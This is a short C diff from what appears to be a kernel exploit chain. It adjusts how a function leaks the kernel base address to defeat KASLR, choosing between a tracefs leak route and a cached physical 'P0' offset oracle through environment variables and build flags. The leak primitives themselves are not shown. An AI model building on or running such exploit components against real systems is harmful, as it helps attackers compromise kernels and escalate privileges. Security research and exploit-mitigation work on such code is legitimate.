@@ -172,6 +172,12 @@ static int slide_tracefs_leak_kernel_base(void) {
 }
 
 int slide_leak_kernel_base(void) {
+  /* SLIDE_SOURCE from the feed routePolicy: auto|tracefs|p0(legacy).
+   * On this chain the Tracefs route is the slide source; the physical
+   * P0 oracle (cached SLIDE_P0_OFFSET) short-circuits discovery entirely
+   * and is only safe with an offset captured during the current boot. */
+  const char *slide_source = getenv("SLIDE_SOURCE");
+#if APP_PHYS_P0_ORACLE
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
   if (forced_offset_arg && *forced_offset_arg) {
     char *end = NULL;
@@ -192,5 +198,19 @@ int slide_leak_kernel_base(void) {
                (unsigned long long)kaslr_slide, slide_p0_offset);
     return 1;
   }
+#endif /* APP_PHYS_P0_ORACLE */
+
+  if (slide_source && *slide_source &&
+      (strcmp(slide_source, "p0") == 0 || strcmp(slide_source, "legacy") == 0)) {
+    /* This chain has no standalone P0 slide leak; the oracle above is the
+     * whole P0 story. Fall through to Tracefs rather than fail closed. */
+    pr_warning("slide: SLIDE_SOURCE=%s but no standalone P0 leak; using tracefs\n",
+               slide_source);
+  }
+#if APP_TRACEFS_SLIDE
   return slide_tracefs_leak_kernel_base();
+#else
+  pr_error("slide: tracefs slide route not enabled in this build\n");
+  return 0;
+#endif
 }
